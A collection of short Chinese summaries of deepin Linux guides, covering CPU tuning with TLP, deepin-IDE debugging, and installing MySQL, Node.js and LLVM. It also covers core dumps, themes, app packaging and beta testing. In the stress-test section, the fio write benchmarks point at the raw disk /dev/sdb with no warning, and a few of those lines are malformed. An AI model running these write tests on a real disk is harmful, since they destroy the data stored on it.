标题：用tlp解决CPU不降频、温度高、风扇狂转的问题
本文针对英特尔CPU，通过调整CPU scaling governor解决相关问题，其他CPU可研究tlp配置文件。

步骤1需确保CPU使用Intel P-state，输入命令`cat /sys/devices/system/cpu/intel_pstate/status`查看状态。

若Intel P-state状态非active，需在grub添加intel_pstate，编辑/etc/default/grub，在GRUB_CMDLINE_LINUX_DEFAULT后加intel_pstate=force，保存后执行`sudo update-grub2`重启。

若重启后Intel P-state仍非active，创建含特定命令的txt文件，设为可运行程序，在~/.config/autostart创建.desktop文件使其开机自启。

步骤2：安装tlp，终端输入`sudo apt install tlp`

步骤3：修改tlp参数，编辑/etc/default/tlp，设置CPU_SCALING_GOVERNOR等参数，保存文件。

tlp参数设置：CPU_SCALING_GOVERNOR_ON_AC=powersave，CPU_SCALING_GOVERNOR_ON_BAT=powersave等。

步骤4：运行tlp，终端输入`sudo tlp start`

不建议禁用Intel P-state，会阉割睿频，限制CPU频率。

系统自带laptop-mode-tools，与tlp性质相同，安装tlp后建议卸载它，由tlp接管电源管理。

tlp设置原则：不插电选最省电，插电选第二高性能，设置后运行sudo tlp start重载。

给CPU施压的简单方法：终端输入`time echo “scale=5000; 4*a(1)” | bc -l -q`计算圆周率。

标题：deepin-IDE 中的调试技术
deepin-IDE 的调试功能选用 DAP（Debug Adapter Protocol ）调试适配协议实现，整体架构围绕该协议搭建。

DAP 即调试适配协议，是对多种调试器进行抽象统一的适配层，将原有 IDE 和调试工具直接交互的模式更改为和 DAP 进行交互。

DAP 思想和 LSP(语言服务器协议)、BSP(构建服务器协议)类似，都是通过协议统一相同功能在不同工具间的差异性。

开发工具与调试器交互有单会话模式和多会话模式。单会话模式下，开发工具启动调试适配器作为单独进程，通过标准 std 接口通信，会话结束适配器终止。

多会话模式下，开发工具不启动调试适配器，假定其已运行并在特定端口侦听，每个会话在特定端口启动新通信会话，结束时断开连接。

DAP 基础协议含头和内容，类似 HTTP，头部和内容用“
”分割。协议头必须有 Content-Length 字段，记录内容长度，单位字节，用 ASCII 编码。

DAP 内容部分是实际传输数据，用 JSON 格式描述请求、响应和事件，采用 utf-8 编码。

deepin-IDE 调试功能结合 cppdap + debugmanager 实现。cppdap 是基于 C++ 的 SDK，实现 DAP 全量协议。

cppdap 实现通信功能（服务端 TCP 监听、客户端 TCP 连接等）、DAP 协议封装及串行化/解串行化、提供注册回调处理事件和请求。

deepin-IDE 客户端包含业务模块、事件模块、DAP 模块和界面4个部分，负责与 DAP 服务端交互、转换数据显示及响应界面事件。

客户端业务模块含插件类、调试参数、调试管理类等，插件类负责插件加载等，调试管理类组合事件、DAP、界面模块。

客户端事件模块有事件发送和接收子模块，处理页面跳转、添加/移除断点等事件。

客户端 DAP 模块基于 cppdap 开发，分三层：底层封装原始 DAP 协议，中间层简化接口，上层整合调试功能。

客户端界面模块有堆栈界面、变量界面、断点列表、异步对话框等，用于展示 DAP 数据。

deepin-IDE 服务端基于 cppdap 实现命令收发，通过进程调用与 gdb 交互，实现调试程序的启动、暂停、退出等。

标题：deepin-unioncode 用户使用手册
deepin-unioncode是一款轻量级多语言跨平台兼容的集成开发环境，支持多种语言工程的构建、运行和调试。

运行deepin-unioncode可单击任务栏启动器图标，找到其图标单击；也可右键图标发送到桌面、任务栏或设为开机自动启动。

关闭deepin-unioncode可单击主界面关闭图标，或右键任务栏图标选关闭所有，或单击主界面菜单图标选退出。

主界面导航栏可快速访问最近打开、编辑、Git、svn界面；菜单栏含文件、编译等菜单项；主要交互区展示各界面功能。

最近打开界面中，双击最近打开工程列表可打开工程；双击最近打开文档列表可打开文件，悬浮可查看相关信息。

编辑界面工作区展示工程目录树等；工具栏有构建、运行等功能；编辑器展示文件内容；交互区有控制台等功能。

Git界面中，OPEN按钮打开已有仓库，CLONE按钮复制远程仓库，NEW按钮创建新仓库。

SVN界面中，单击汉堡菜单可执行打开仓库和检出仓库功能。

打开文件可在菜单栏文件下拉菜单选打开文件，或在文件管理器中拖放文件至编辑器区域。

打开工程需在菜单栏文件下拉菜单选打开工程，选语言和构建工具，再选工程。

新建文件要在菜单栏文件下拉菜单选新建文件或工程，选语言类型，输入文件名和路径，点击创建。

文本编辑支持输入、删除、移动光标、选中文本、复制、粘贴、剪切、撤销、恢复等操作。

当前文件查找/替换可通过Ctrl + F或菜单栏编辑项打开查找工具栏，输入文本进行查找或替换。

高级文件查找/替换可在菜单栏编辑项选高级查找，选查找范围，输入文本，设置过滤选项等。

文本格式化可选中文字后右键，选择选中范围格式化。

重命名需选中文本右键，选重构，再选中重命名。

引用查找是选中文本右键选查找用法，交互区会列出引用信息，双击文件可跳转。

定义跳转可按住Ctrl键，鼠标左键点击函数名等跳转到定义处。

环境配置在菜单栏工具下拉菜单选选项，找到构建工具，配置编译器、调试器等，点击应用。

构建工程可右键工程树根目录选工程属性，配置后点击构建按钮或用Ctrl+B。

重新编译是在菜单栏编译下拉菜单选重新编译，会清空输出目录文件并重新编译。

清除是在菜单栏编译下拉菜单选清除，清空编译输出目录生成的文件。

断点标记可在编辑器左侧行标处单击打红点，再单击取消。

运行是在工具栏单击运行图标，工程代码跳过断点直接运行。

调试需先打断点，点击开始调试，程序到第一个断点停止，可进行停止、继续等操作。

反向调试记录需打开C/C++工程且编译成功，在工具下拉菜单选反向调试>记录，配置后确认启动。

反向调试回放是在工具下拉菜单选反向调试>重放，配置后确定打开回放界面。

代码迁移需激活C/C++工程，在工具下拉菜单选代码迁移，配置后点击迁移。

用户行为分析可在工具栏工具下拉菜单勾选，取消勾选则取消提示。

内存泄漏检测在工具下拉菜单单击Valgrind内存检测，工程编译运行后交互区展示结果。

死锁检测在工具下拉菜单单击Valgrind死锁检测，工程编译运行后交互区展示结果。

二进制工具可在工具下拉菜单单击打开，可添加、删除、重命名、组合二进制应用等。

Git打开仓库可在git界面单击OPEN按钮，选择待打开工程。

Git克隆仓库需在git界面单击CLONE按钮，输入配置参数，勾选配置项后单击Accept。

Git新建仓库在git界面单击NEW按钮，输入参数，勾选配置项后单击Accept。

SVN检出仓库在SVN界面单击汉堡菜单选检出仓库，输入参数后单击确定。

帮助菜单的关于项可查看deepin-unioncode的版本和介绍。

关于插件项可查看插件管理对话框，含插件概览和详情，可管理插件加载。

报告Bug项可跳转到官网bug提交页面；帮助文档项跳转到官网帮助文档页面。

标题：Linux 内存泄露案例分析和内存管理分享
线上LB服务内存报警，部分机器内存使用率超80%，甚至90%，且持续增长。LB服务是多业务流量入口，影响大。

通过cat /proc/meminfo查看Slab的内核内存可能有泄漏，slabtop命令发现dentry对象占比高，怀疑与socket文件有关，排查发现LB服务上的curl发送HTTPS探测脚本存在dentry对象泄漏，curl-7.19.7版本依赖的NSS库有此bug。

临时措施：停止探测脚本，业务低峰时用drop_caches清理缓存。永久解决方案：大促后在探测脚本中设置环境变量NSS_SDB_USE_CACHE。

Linux内存寻址有逻辑地址、线性地址（虚拟地址）、物理地址。MMU通过分段单元将逻辑地址转线性地址，分页单元将线性地址转物理地址。

Linux分页机制中，线性地址分页，RAM分成页框，页表用于映射线性地址与物理地址。x86_64 Linux采用4级分页模型，一页4K，有页全局目录、页上级目录、页中间目录、页表。

NUMA架构即非一致性内存架构，物理内存划分为节点，每个节点绑定不同CPU核，本地CPU核访问本地内存节点延迟最小。可用lscpu命令查看NUMA与CPU核关系。

Linux内存检测工具包括free、top、smaps文件、vmstat、meminfo文件，分别用于监控系统内存、查看系统及进程内存、查看进程虚拟内存分布、实时监视系统活动、记录系统内存使用详情。

Linux内核推迟给用户态进程动态分配内存，采用请求调页（访问页不在RAM时引发缺页异常）和写时复制（父子进程共享页框，改写时复制新页框）机制。

top命令中，VIRT是进程使用的所有虚拟内存，RES是进程占用的实体内存，不包括换出部分，SHR是进程可读的全部共享内存。

标题：Linux系统压力测试工具
Linux命令行压力测试工具用于基准测试，可了解系统最大性能指标，作为性能比较和优化评估的参考。

stress命令可模拟CPU高负载，-c选项指定CPU核心数，如stress -c 4让4个CPU核心高负载运算。

模拟CPU打满可用命令：stress -c 1 -t 100，-t选项用于指定运行N秒后停止。

stress命令的-v选项显示版本号，-q选项不显示运行信息，-n选项显示已完成的指令情况。

stress命令的--backoff N选项表示等待N微妙后开始运行，-i选项产生n个进程，每个反复调用sync()。

fio是灵活的Linux I/O性能测试工具，可测试磁盘、SSD、网络存储等，支持多种I/O操作测试。

fio随机读命令：fio -name=randread -direct=1 -iodepth=64 -rw=randread -ioengine=libaio -bs=4k -size=1G -numjobs=1 - runtime=1000 -group_reporting -filename=/dev/sdb

fio随机写命令：fio -name=randwrite -direct=1 -iodepth=64 -rw=randwrite -ioengine=libaio -bs=4k -size=1G -numjobs=1 - runtime=1000 -group_reporting -filename=/dev/sdb

fio顺序读命令：fio -name=read -direct=1 -iodepth=64 -rw=read -ioengine=libaio -bs=4k -size=1G -numjobs=1 - runtime=1000 -group_reporting -filename=/dev/sdb

fio顺序写命令：fio -name=write -direct=1 -iodepth=64 -rw=write -ioengine=libaio -bs=4k -size=1G

sysbench创建初始化fileio文件：sysbench --test=fileio --file-num=16 --file-totalsize=2G prepare

sysbench测试文件：sysbench --test=fileio --file-total-size=2G --file-testmode=rndrd --max-time=180 --maxrequests=100000000 --num-threads=16 --init-rng=on --file-num=16 --file-extra-flags=direct --file-fsync-freq=0 -file-block-size=16384 run

sysbench测试后清理：sysbench --test=fileio --file-num=16 --file-totalsize=2G cleanup

iperf3用于网络吞吐量测量，可测试TCP、UDP或SCTP的吞吐量。

iperf3客户端命令：iperf3 -c 10.20.81.33 -p 5002 -i 2 -t 1000，向指定地址和端口发TCP流。

iperf3服务端命令：iperf3 -s -p 5002 -i 2

查看端口禁用列表：iptables -L -n --line-number

禁用出口端口：iptables -A OUTPUT -p tcp --sport 18004 -j DROP

禁用入口端口：iptables -A INPUT -p tcp --dport 18004 -j DROP

删除入口端口规则：iptables -D INPUT 1，删除出口端口规则：iptables -D OUTPUT 1

Stress工具可对内存、磁盘I/O做压力测试，Stress-ng是其增强版。

Sysbench主要用于数据库服务器性能测试，也可测试系统的CPU、内存和磁盘I/O性能。

标题：如何在deepin上部署nodejs开发环境
Node.js是基于Chrome V8引擎的JavaScript运行环境，使用事件驱动、非阻塞式I/O模型，让JavaScript运行在服务端。

在deepin上可通过sudo apt install nodejs命令从源里安装nodejs，安装后用node -v验证，成功会输出版本号如v10.21.0。

从源安装的nodejs版本较低，可下载安装包安装，下载地址为https://nodejs.org/zh-cn/download/，选择Linux二进制文件及对应系统架构。

用wget下载nodejs安装包，如wget https://nodejs.org/dist/v18.14.2/node-v18.14.2-linux-x64.tar.xz，再解压到/usr/local/。

解压后将文件夹重命名为node，命令为sudo mv /usr/local/node-v18.14.2-linux-x64 /usr/local/node。

需添加环境变量，编辑~/.bashrc（zsh用.zshrc，全局用/etc/profile），添加export NODE_HOME=/usr/local/node等内容。

创建node_global和node_cache文件夹，命令为mkdir /usr/local/node/node_{global,cache}，并设置npm前缀和缓存路径。

可用npm config list查看配置列表，添加环境变量后用source ~/.bashrc刷新shell环境。

标题：如何在deepin下使用EasyX库
EasyX是针对C++的图形库，能帮助C/C++开发者快速上手图形设计，在VS上完美使用，2022年6月10日提供适配MinGW的库文件，开始支持MinGW编译器。

CLion是JetBrains出品的跨平台C/C++集成开发环境，基于IntelliJ设计，能在GNU/Linux、OS X和Windows上开发。

Debian系GNU/Linux发行版安装MinGW命令：sudo apt-get update；sudo apt-get install mingw-w64。

MinGW是适用于Windows的极简主义GNU，是Windows特定头文件和GNU工具集导入库的集合，能在GNU/Linux和Windows生成本地Windows程序，MinGW-w64可编译32位和64位可执行文件。

CLion中设置MinGW工具链：点击“+”创建新工具链，命名为“mingw”，设置C/C++编译器为x86_64-w64-mingw32-gcc和x86_64-w64-mingw32-g++。

CLion中创建新CMake：点击“+”，修改文件名，修改工具链为之前构建的MinGW工具链。

CMakeLists.txt原生内容包含cmake_minimum_required、project、set、add_executable等命令，分别用于设置最低cmake版本、项目名、C++标准、生成可执行文件。

在Test项目目录下创建bin、include、lib、src文件夹，分别用于存放可执行文件、头文件、库文件、源文件。

easyx4mingw_20220901.zip包含include、lib32、lib64、lib-for-devcpp_5.4.0文件夹及readme.txt，将easyx.h和graphics.h拷贝到项目include目录，对应位数的libeasyx.a拷贝到lib目录完成安装。

CMakeLists配置中，set(CMAKE_EXE_LINKER_FLAGS ...)让cmake采用静态编译；SET(EXECUTABLE_OUTPUT_PATH ...)设置可执行文件存放目录；link_directories指定库文件目录；target_link_libraries链接库文件。

使用EasyX库的示例代码中，initgraph初始化画布，setcolor设置线条颜色，fillcircle绘制填充圆，getch暂停，closegraph关闭图形界面。

在Deepin系统中，可用wine运行生成的Test.exe文件，Debian系可通过sudo apt update && sudo apt install wine安装wine。

标题：deepin下调试coredump文件
Core Dump指程序异常终止或崩溃时，将内存内容拷贝到磁盘文件的技术。

终端输入ulimit -c可检查当前系统的Core dump策略，输出0表示默认关闭。

临时开启Core Dump：终端输入ulimit -c unlimited，仅对当前终端有效。

永久开启Core Dump方法一：修改/etc/security/limits.conf，最后加* soft core unlimited。

永久开启Core Dump方法二：在/etc/profile中加入ulimit -c unlimited，需重启系统。

永久开启Core Dump方法三：在~/.bashrc添加ulimit -c unlimited，执行source ~/.bashrc生效，仅对当前用户有效。

测试需安装build-essential和gdb，命令：sudo apt update && sudo apt install build-essential gdb。

编译测试程序命令：gcc main.c -g -o test，需在main.c所在目录执行，-g方便调试。

调试core文件用gdb，语法：gdb [程序] [core文件]，例子：gdb ./test core。

在gdb中输入bt可查看backstrace，定位core dump发生的位置。

临时让core文件带pid扩展名：sudo bash -c "echo 1 > /proc/sys/kernel/core_uses_pid"。

core_uses_pid为0时core文件统一命名为core，为1时带pid扩展名（core.xxxx）。

永久修改core文件路径和命名：修改/etc/sysctl.conf，添加kernel.core_pattern和kernel.core_uses_pid，执行sysctl -p /etc/sysctl.conf生效。

core文件参数%p是进程号，%u是用户号，%g是组号，%s是信号，%t是时间戳，%h是主机名，%e是程序名。

永久限制core文件大小：修改/etc/security/limits.conf，加* soft core limit（单位KB），需重启。

临时限制core文件大小：终端输入ulimit -c limit（单位KB）。

标题：如何在deepin下部署MySQL服务
MySQL是关系型数据库管理系统，由瑞典MySQL AB公司开发，属Oracle旗下产品，是流行的关系型数据库管理系统之一，在WEB应用方面是最好的RDBMS应用软件之一。

在deepin下部署MySQL服务不使用命令行从软件源安装，考虑配置灵活及多版本共存，使用通用包解压安装，MySQL5.x与8.x配置有区别，分别给出安装方式。

MySQL5.x获取通用二进制安装包可从官方下载，选择5.7.40 x64版本，用wget命令获取，解压到/usr/local，重命名为mysql5，创建data、log目录及相关文件，赋予mysql用户权限。

MySQL5.x配置文件在mysql5目录下创建my.cnf，[mysqld]中设置bind-address为0.0.0.0，端口3306，basedir和datadir路径，socket位置等；[mysql]和[client]设置默认字符集和socket等。

MySQL5.x创建用户组，mysql用户不涉及登录，仅作运行用户，用groupadd mysql创建组，useradd -r -g mysql -s /bin/false mysql创建用户。

MySQL5.x初始化用指定命令，需指定配置文件、数据目录、安装目录和用户，初始化后在mysql.err中查看随机密码，最后一行有11位密码。

MySQL5.x添加服务到系统，复制mysql.server到/etc/init.d/mysql5，替换basedir、datadir等变量，授权并刷新服务，可启动、停止服务，查看状态，添加软链接到/usr/bin/mysql5。

MySQL5.x登录可用mysql5 -u root -h 127.0.0.1 -p或指定sock路径，修改密码用set password命令，更新root主机权限并刷新。

MySQL8.x安装包选8.0.32 x64版本，用wget获取，解压到/usr/local，重命名为mysql8，创建data、log目录及文件，赋予mysql用户权限。

MySQL8.x配置文件my.cnf在mysql8目录下，[mysqld]等部分设置与5.x类似，包括端口、路径、字符集等。

MySQL8.x初始化命令类似5.x，指定对应配置文件、目录和用户，随机密码在mysql.err最后一行，添加服务到系统需复制文件并替换变量，启动停止命令类似。

MySQL8.x登录命令与5.x类似，修改密码用ALTER USER语句，更新root主机权限并刷新，两版本若同时运行需设不同端口并连接时指定。

标题：用llvm编译linux内核
llvm是一个编译器框架，用llvm编译内核需llvm9默认支持。

LLVM项目子项目有LLVM、clang、libc、libcxx、libcxxabi、libunwind、compiler-rt、lld、lldb、clang-tools-extra等。

编译LLVM前期准备需安装llvm-6.0、clang-6.0、lld-6.0，创建软链接，安装cmake和ninja-build。

LLVM源代码可从http://releases.llvm.org/9.0.0/llvm-9.0.0.src.tar.xz下载，也可从清华大学开源镜像站获取。

构建llvm基础时，cmake命令可指定-G Ninja、CMAKE_BUILD_TYPE=Release等参数，用ninja -j 4构建，sudo ninja install安装。

CMAKE_BUILD_TYPE的取值有Release、Debug、RelWithDebInfo、MinSizeRel。

构建clang时，cmake命令需指定-LLVM_PATH=../llvm-9.0.0.src/，然后ninja构建并安装。

构建lld时，cmake命令需指定相关参数，之后用ninja构建和安装。

动态链接库由ldconfig配置，默认跟踪/usr/lib、/lib，可通过/etc/ld.so.conf等文件增加目录，sudo ldconfig更新缓存。

不想编译llvm可直接用apt包，先获取apt源秘钥，再配置apt source。

内核编译可修改cc和c++命令链接到clang和clang++，用sudo make CC=clang xconfig设置配置，make deb-pkg CC=clang -j4编译。

编译内核时可设置CC=clang、CXX=clang++、AS=llvm-as等环境变量指定相关工具。

LLVM的libc++依赖libc++abi，libc++abi依赖libunwind。

GNU的libstdc++依赖libsupc++，libsupc++依赖libgcc_s。

验证LLVM源代码签名需导入公钥hans-gpg-key.asc，用pgp --verify命令。

标题：GTK窗口主题
本小节介绍深度操作系统默认桌面环境下设置GTK主题和窗口主题的方法。DTK程序用无边框窗口加类似标题栏控件实现，标题栏主题修改不影响其样式，其他非传统标题栏应用同理。

GTK主题和窗口主题的配置文件存放目录有~/.themes（用户自定义配置）和/usr/share/themes（全局配置）。

便捷安装窗口主题：下载并安装Deb文件后，打开控制中心——个性化——窗口，设置喜欢的主题。

手动安装窗口主题：用带Root权限的文件管理器进入目录，终端执行sudo dde-file-manager /usr/share/themes，再打开控制中心——个性化——窗口设置。

卸载窗口主题：用带Root权限的文件管理器进入/usr/share/themes目录，删除不需要的主题。

GTK3.X主题资源可在http://gnome-look.org/index.php?xcontentmode=167下载，GTK2/3主题推荐见http://planet.linuxdeepin.com/2012/04/12/gtk-2-and-gtk-3-theme-for-linux-deepin/。

标题：个性化-如何添加自定义主题
添加自定义主题可前往https://www.gnome-look.org/、https://www.opendesktop.org等网站下载主题文件，格式多为tar.gz或zip，需解压。

GTK主题必须包含gtk-2.0、gtk-3.0、metacity-1目录和index.theme文件。

所有用户可用的GTK主题需复制到/usr/share/themes目录，操作需管理员权限，完成后注销或杀掉控制中心，在控制中心-个性化-窗口主题选择生效。

个人使用的GTK主题复制到主目录的.local/share/themes，按ctrl+H显示隐藏文件，完成后注销或杀掉控制中心，在控制中心-个性化-窗口主题选择生效。

图标主题除index.theme文件外，其他目录非必需。所有用户可用的图标主题复制到/usr/share/icons，需管理员权限，完成后注销或杀掉控制中心，在控制中心-个性化-图标主题选择生效。

个人使用的图标主题复制到主目录的.local/share/icons，按ctrl+H显示隐藏文件，完成后注销或杀掉控制中心，在控制中心-个性化-窗口主题选择生效。

光标主题包含cursors文件夹和cursor.theme文件。所有用户可用的光标主题复制到/usr/share/icons，需管理员权限，完成后注销或杀掉控制中心，在控制中心-个性化-图标主题选择生效。

个人使用的光标主题复制到主目录的.local/share/icons，按ctrl+H显示隐藏文件，完成后注销或杀掉控制中心，在控制中心-个性化-光标主题选择生效。

标题：深度图标主题
图标是有指示作用的标志，在电脑屏幕桌面上用于指示用户运行操作，多为正方形像素矩阵，大小从16×16到256×256等，部分系统可用矢量图标或大至512×512的图像矩阵。

在深度桌面环境中，若图标主题为Deb包，下载安装后，进入控制中心——个性化——主题选择即可。

若图标主题为压缩包，需先解压，再复制到/usr/share/icons（可能需root权限），之后在控制中心——个性化——主题中可找到。

标题：界面美化
DDE内置个性化设置详见深度桌面环境#桌面美化。

DDE Dock有许多开发者开发的插件，详见DDE-Dock插件。

Fantacene可在DDE环境下使用动态壁纸，也能导入Wallpaper Engine内的壁纸，详见Fantacene。

第三方工具dde-top-panel提供顶栏，可实现类似kde的全局菜单，详见相关论坛和Github仓库。

Chameleon可将窗口菜单集成到标题栏，帮助解决大额头问题，详见相关论坛和Github仓库。

深度论坛用户柚子移植了CutefishOS的第三方圆角适配工具，详见相关论坛。

深度论坛用户柚子开发了Oh-my-dde系统美化管理工具，已上架官方商店。

标题：美化dock
Plank是用Vala语言编写的简单、轻量级dock工具，是Docky 3.0.0的底层技术，提供核心功能，允许Docky扩展Docklets，支持自定义屏幕位置、主题、图标大小及隐藏模式。

安装Plank的命令是sudo apt install plank。

标题：自定义主题
可前往https://www.gnome-look.org/、https://www.opendesktop.org等网站下载主题文件，格式多为tar.gz或zip，需解压。

GTK主题需包含gtk-2.0、gtk-3.0、metacity-1目录及index.theme文件，缺一不可。

所有用户可用的GTK主题，需复制主题目录到/usr/share/themes（管理员身份），注销后在控制中心-个性化-窗口主题选择。

个人使用的GTK主题，复制到主目录的.local/share/themes，注销后在控制中心-个性化-窗口主题选择。

图标主题除index.theme文件外，其他目录非必要。

所有用户可用的图标主题，复制到/usr/share/icons（管理员身份），注销后在控制中心-个性化-图标主题选择。

个人使用的图标主题，复制到主目录的.local/share/icons，注销后在控制中心-个性化-图标主题选择。

光标主题包含cursors文件夹和cursor.theme文件。

所有用户可用的光标主题，复制到/usr/share/icons（管理员身份），注销后在控制中心-个性化-光标主题选择。

个人使用的光标主题，复制到主目录的.local/share/icons，注销后在控制中心-个性化-光标主题选择。

标题：deepin中的office
WPS是金山公司使用QT开发的Office软件，是免费的专有软件，Linux版本现阶段无广告，格式兼容良好，可作为MS Office替代品。

LibreOffice是自由软件，是OpenOffice的分支，功能丰富，兼容性一般，官网为https://www.libreoffice.org/。

OnlyOffice是自由软件，界面设计现代化，功能较少，官网为https://www.onlyoffice.com/。

O20是新项目，目前仅有O20.Word，可通过Flatpak安装，命令为flatpak install flathub io.gitlab.o20.word，官网为https://abstractsoftware.gitlab.io/。

Apache OpenOffice是自由软件，历史悠久，持续开发但已不活跃，官网为http://www.openoffice.org/。

Microsoft Office是付费专有软件，本身不提供Linux版本，可使用wine运行，官网为https://www.microsoft.com/zh-cn/microsoft-365/microsoft-office，深度商店有打包好的wine版本。

Microsoft Office Web是Microsoft提供的免费Web版Office软件，官网为https://www.microsoft.com/zh-cn/microsoft-365/free-office-online-for-the-web。

石墨Office是支持多种主流Office文件处理能力的国产正版Office办公软件，软件包名为com.shimo.desktop.main，商店上架了Linux版本，官网未提供安装包下载。

标题：Firefox浏览器
Firefox火狐浏览器是安全高效的浏览器，有速度快、隐私保护等特性。

安装Firefox深度桌面版的命令是sudo apt-get install firefox-dde。

卸载Firefox延长支持版用sudo apt-get remove firefox-esr。

安装Firefox中文语言包的命令为sudo apt-get install firefox-l10n-zh-cn。

标题：Chrome浏览器
Chrome谷歌浏览器有稳定版、开发版、测试版及其他版本，Stable供普通用户使用。

安装Chrome测试版的命令是sudo apt-get install google-chrome-beta。

卸载chrome-dde的命令为sudo apt-get remove chrome-dde。

标题：TeamViewer
TeamViewer用于远程控制、桌面共享和文件传输，有即时远程控制等功能。

安装TeamViewer的命令是sudo apt-get install teamviewer。

安装官网下载的TeamViewer deb包用sudo dpkg -i xxx.deb命令。

标题：QQ
QQ是腾讯开发的即时通信软件，支持在线聊天、视频电话等功能。

安装QQ的命令为sudo apt-get install deepin.com.qq.im。

标题：FileZilla
FileZilla是跨平台的FTP、FTPS和SFTP客户端，有断点续传等功能。

安装FileZilla的命令是sudo apt-get install filezilla。

标题：雷鸟邮件
雷鸟邮件是邮件客户端，支持IMAP、POP协议及HTML邮件格式。

卸载雷鸟邮件的命令为sudo apt-get remove thunderbird。

标题：Transmission
Transmission是BitTorrent客户端，支持速度限制、制作种子等功能。

标题：qBittorrent
qBittorrent是轻量级BitTorrent客户端，支持文件上传下载等功能。

标题：BearyChat
BearyChat是团队沟通工具，支持创建讨论组、消息搜索等功能。

标题：安司密信
安司密信是社交应用，支持即时信息发送、网络通话，有绝密会话等功能。

标题：从源代码开始构建玲珑格式应用
安装ll-builder工具的命令是sudo apt install linglong-builder --no-install-recommends，可去除--no-install-recommends安装推荐依赖。

从源代码构建玲珑应用可跳过ll-builder create操作，直接在工程源代码顶层目录编写linglong.yaml文件。

linglong.yaml中package下的id是软件包appid，类似deb包名，用于区分不同玲珑软件包。

玲珑容器启动时，将容器内容files文件夹挂载至/opt/apps/${appid}文件夹下，前缀近似为/opt/apps/${appid}/files。

构建玲珑应用时，在工程源代码顶层目录执行ll-builder build命令。

首次构建玲珑应用需下载指定的base和runtime，耗时较长。

测试运行玲珑应用可执行ll-builder run --exec 可执行程序名称命令。

导出layer文件执行ll-builder export命令，会生成${appid}_${version}_${arch}_develop.layer和${appid}_${version}_${arch}runtime.layer文件。

安装layer文件使用ll-cli install命令，将runtime.layer文件拖入终端执行。

若启动器中找不到应用，可查看linglong/output/runtime/entries/share/applications文件夹是否有.desktop文件。

qmake工程中，可通过修改.pro文件或在linglong.yaml构建部分传入参数设置安装前缀。

标题：应用卸载
从启动器卸载应用：打开启动器，右击要卸载应用的图标，点击“卸载”。启动器卸载仅对部分应用有效。

从深度应用商店卸载应用：打开应用商店，切换到“应用管理”页面，点击要卸载应用右侧的“卸载”。

使用命令卸载应用：打开终端，执行sudo dpkg -r [软件包名]或sudo apt remove [软件包名]，确认无系统关键程序后输入Y确认，再执行sudo apt autoremove删除无用依赖。

标题：应用安装
本页面主要讲述如何在 deepin 上安装应用软件。

deepin 内置深度商店, 里面中收录了大量热门 Linux 应用、Wine 应用，支持一键下载和自动安装。

星火应用商店是一款由社区爱好者维护，致力于丰富 Linux 生态的第三方应用商店。商店中收录了大量最新版本的 Linux 应用和开箱即用的 Wine 应用。

星火商店仓库地址：https://gitee.com/deepin-community-store/spark-store

很多 Linux 应用的官网提供了下载地址。访问这些网站，下载适用于 x86 架构的 64 位（或标有 amd64）deb 包。

下载完成后，双击 deb 包打开，使用深度软件包管理器进行安装。或是在安装包目录下执行命令安装。

在安装包目录下执行如下命令，可查看详细安装信息：sudo dpkg -i 文件名；sudo apt install -f 或 sudo apt install ./文件名.deb

打开终端，执行命令 sudo apt install 软件包名 安装软件，将软件包名替换为要安装软件的软件包名。

如果不知道要安装软件的软件包名，可使用命令 apt search --names-only [关键词] 搜索。

新立得软件包管理器是一款图形界面的deb包管理器，相当于终端里的apt命令。

终端执行命令 sudo apt install synaptic 安装新立得。

打开新立得软件包管理器，在要安装的软件包上右击，点击“标记以安装”。点击“应用”后开始安装软件。

标题：玲珑应用的使用
玲珑的用户命令为：`ll-cli`，是一个包管理器前端，用于管理玲珑应用的安装、卸载、查看、启动、关闭、调试、更新等操作。

查看`ll-cli`命令的帮助信息，在终端中输入：`ll-cli`。

`ll-cli install`命令用来安装玲珑应用，在终端中输入：`ll-cli install <package name>`，请不要使用root/sudo。

`ll-cli uninstall`命令可以卸载玲珑应用，在终端中输入：`ll-cli uninstall <package name>`，请不要使用root/sudo。

`ll-cli update`命令可以更新玲珑应用，在终端中输入：`ll-cli update <package name>`，请不要使用root/sudo。

`ll-cli list`命令可以查看已安装的玲珑应用，在终端中输入：`ll-cli list`，请不要使用root/sudo。

ll-cli的subcommand包括run、ps、exec、kill、download、install、uninstall、update、query、list。

typora编辑器的玲珑应用包名是io.typora。

中望CAD的玲珑应用包名是com.zwsoft.zwcad。

brave浏览器的玲珑应用包名是com.brave.brave-browser。

360浏览器的玲珑应用包名是com.360.browser-stable。

xmind的玲珑应用包名是net.xmind.xmind-vana。

postman的玲珑应用包名是com.postman.postman。

wps的玲珑应用包名是cn.wps.wps-office。

谷歌浏览器的玲珑应用包名是cn.google.chrome。

网易云音乐的玲珑应用包名是com.163.music。

vscode的玲珑应用包名是com.visualstudio.code。

百度网盘的玲珑应用包名是com.baidu.baidunetdisk。

微信(wine)的玲珑应用包名是com.qq.weixin.deepin。

QQ（wine）的玲珑应用包名是com.qq.im.deepin。

企业微信（wine）的玲珑应用包名是com.qq.weixin.work.deepin。

标题：deepin内测指南
V20系统版本需要保持V20.7或以上版本才能加入内测。

V20版本开启内测通道：打开【控制中心】》【更新】》【更新设置】》【内测源更新】，按指引完成。

手动在sources.list文件中添加内测源信息无法收到内测更新，需通过内测通道加入。

V23版本开启内测通道：打开【控制中心】》【更新】》【更新设置】》【内测源更新】，按指引完成。

内测守则：保持系统版本升级到最新内测版，避免版本不一致导致问题差异。

内测守则：千万不能添加其他第三方仓库源信息（除部分第三方应用源信息外）。

BUG反馈需写明前置条件，即现象发生时做了哪些操作可能导致该问题，必现问题可省略。

BUG反馈需要写明详细的复现步骤，以便官方人员第一时间复现核实问题。

BUG反馈需明确说明预期结果和实际结果，避免不同人员理解不一致。

BUG反馈最好提供截图录屏（静态截图、mp4、gif均可），明确反馈问题所在。

非必现问题需提供系统日志信息，方便研发定位排查。

需求类问题可直接到论坛反馈：bbs.deepin.org。

内测问题可通过https://cooperation.uniontech.com:443/form/0e6ac124e47347a8bad3d2a9d538075d反馈。

反馈后的个人信息可通过https://cooperation.uniontech.com/public/query/62e393406a2fe2750411052e查询。

退出内测方式：直接关闭控制中心的内测通道即可。

标题：cpu频率简单调节
调节cpu频率可使电脑在满意状态运行，需根据设备个性化设置，有一定动手能力和知识储备。

cpu有最佳功耗比范围，小马拉大车或大马拉小车都费电，电能转化为热能，表现为发热、风扇狂转。

风扇转速与cpu频率相关，非温度；一核负载高风扇就狂转；deepin负载均衡可能导致一核有难n核围观，总占用不高风扇也转。

调节风扇转速最简单的方法是调节频率，调低频率不一定降低发热，可能又卡又烫。

调教cpu核心思想是让频率在最佳能耗范围，方法需反复测试，因电脑硬件和使用习惯不同，最终数据不同。

